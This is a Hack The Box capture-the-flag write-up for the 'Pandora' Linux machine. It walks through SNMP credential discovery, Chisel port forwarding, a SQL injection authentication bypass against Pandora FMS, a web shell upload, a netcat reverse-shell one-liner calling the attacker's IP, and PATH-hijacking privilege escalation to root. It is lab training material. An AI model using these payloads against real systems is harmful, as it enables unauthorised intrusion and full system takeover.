# Pandora Write-up
Hi everyone, let's start to h4ck !
## Description
The box is available [here](https://app.hackthebox.com/machines/Pandora) if you want to try before read this write-up !

 - OS : Linux
 - Release date : 08 january 2022
 - Difficulty : easy
 - Points : 20
 - IP Adress : ```10.10.11.136```

Pandora is a nice box for beginner and interesting to learn new tools.

## Foothold
### Scanning The Box :
So first, we gonna scan the IP adress with the popular tool **Nmap** with the command :
```markdown
nmap 10.10.11.136 -sC -sV -p-
```

We have the following result :
```markdown
# Nmap 7.91 scan initiated Sun Feb 20 21:02:20 2022 as: nmap -p- -sC -sV -oA scan_nmap 10.10.11.136
Nmap scan report for Pandora.htb (10.10.11.136)
Host is up (0.030s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 20 21:02:42 2022 -- 1 IP address (1 host up) scanned in 21.80 seconds
```
We can see there is two open ports : *HTTP* (80) and *SSH* (22).

The SSH version seems not be vulnerable to a CVE, so we gonna check the website with **Nikto** and **Gobuster**.
```markdown
nikto -h 10.10.11.136
gobuster dir --url http://10.10.11.136 -w /usr/share/wordlist/dirb/big.txt -x html,php,txt,xml,bak,zip
```

We have find some infos and files but nothing interesting.

I try to re-check my scan with **Nmap** but here, I made a *UPD-Scan* :
```markdown
nmap 10.10.11.136 -sU
```
Now, we have a new port, a UDP-port :
```markdown
161/udp open|filtered snmp   SNMPv1 server; net-snmp SNMPv3 server (public)
```
SNMP is short of *Simple Network Management Protocol*. The explaination can be find [here](https://www.manageengine.com/fr/network-monitoring/what-is-snmp.html)

### Interaction with the SNMP server : 
Here we use *snmp-check*, a tool already installed in Kali-linux.
The syntax is simple: 
```markdown
snmp-check -p 161 10.10.11.136
```
After do this, we have got a long output and when we read it, we can see this interesting line:
```markdown
850                   runnable              sh                    /bin/sh               -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'
```
There is a process which use credentials of the user *Daniel* !

So we can use *SSH* now !

## User Flag
First, we check the other users present in the box. There is another user who call *Matt*.
```markdown
cat /etc/paswd | grep /bin/bash
```
```markdown
root:x:0:0:root:/root:/bin/bash
matt:x:1000:1000:matt:/home/matt:/bin/bash
daniel:x:1001:1001::/home/daniel:/bin/bash
```
We have no flag in our account so the user flag is in *Matt*'s account.
### Analyse the box 
We need to upgrade our lower access to a higher access to become *Matt*.

We can check the *SUID* files:
```markdown
find / -type f -perm /6000 -ls 2>/dev/null
```
We can do a ```sudo -l``` or a ```cat /etc/crontab``` too but we have nothing interesting.

We can use a popular automated tool which call [LinPEAS](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh) to check all the misconfigurations present.
But with LinPEAS, we found nothing.

We read the hosts file.
```markdown
cat /etc/hosts
127.0.0.1       localhost
```

We try to cURL the localhost with ````curl 127.0.0.1```` and there is a website made with [*PandoraFMS*](https://pandorafms.com).

### Access to the site

So we have access to the site in local only. It is the best moment to introduce the tool [**Chisel**](https://github.com/jpillora/chisel).

**Chisel** is using for port fowarding, so here, we use it to forward the local website to our machine. After upload the binary, we use the following commands:

In our machine:
```markdown
./chisel server -p 8888 -reverse
```

In *Daniel*'s machine:
```markdown
./chisel client {YOUR_IP}:8888 R:8889:localhost:80
```

Now, go in our web browser and we have access to the site.

![alt text](https://github.com/Vssksj/My_projects/blob/main/HackTheBox/Pandora/web_pandora.jpg)

As you see, there is a login/password page. We test admin/admin ; admin/password but no result.

In the bottom, there is the version of *PandoraFMS* : ````v7.0NG.742````. Go check if there is a exploit for this version and when we search a little, we found 
a *bypass authentification* with a [Youtube Video](https://youtu.be/61KE45V7VT8). The bypass works with a *SQL injection*. Now, we are admin of the website. 

The exploit is:
```markdown
include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
```

### Become Matt
We need a shell as *Matt*, so we gonna upload a reverse shell in the extensions part. We can't directly upload a php file but we can bypass this with a ```.zip``` file which content our shell. 

![alt text](https://github.com/Vssksj/My_projects/blob/main/HackTheBox/Pandora/upload_zip.png)

Now, go in ````http://localhost:8889/pandora_console/extensions/{YOUR_PAYLOAD}.php````. Here, it is a web shell because a try a reverse shell but it didn't work. After, in my web shell, I put a reverse shell with ````rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {YOUR_IP} 1234 >/tmp/f```` and it worked. We are *Matt* !

![alt text](https://github.com/Vssksj/My_projects/blob/main/HackTheBox/Pandora/id_matt.png)

To have a better shell, put your public *SSH* key in the ````/home/matt/.ssh/authorized_keys````. Then connect with:
```markdown
ssh -i {YOUR_PRIVATE_KEY} matt@10.10.11.136
```
And you will be in *SSH*.

![alt text](https://github.com/Vssksj/My_projects/blob/main/HackTheBox/Pandora/id_rsa_matt.png)

## Privilege Escalation
The last step of the challenge is easy. Just made a basic enumeration and you will find a *SUID* file which call ````/usr/bin/pandora_backup````.

If we make a ````cat````, we see that the binary execute **tar**. 

To exploit this, it is really simple:
 - go in ````/tmp```` and create a file contain ````/bin/bash````. 
 - rename the file as ````tar````.
 - change the permissions 
 - export the *$PATH*

So let's do this:
```markdown
cd /tmp
echo '/bin/bash' > tar
chmod 777 tar
export PATH=/tmp:$PATH
```

When we execute the binary: 

![alt text](https://github.com/Vssksj/My_projects/blob/main/HackTheBox/Pandora/id_root.png)

BOOM ! We are ROOT !

*Note: It really important to run this in SSH beause when I tried in a 'bad shell', it didn't work.*

## Conclusion
This box was really fun and good for the beginners because you can learn notion as *Port Forwarding*, *Privilege Escalation* and *UDP Scan*. I recommend this box, 5 stars.

Thanks for reading ! :) 
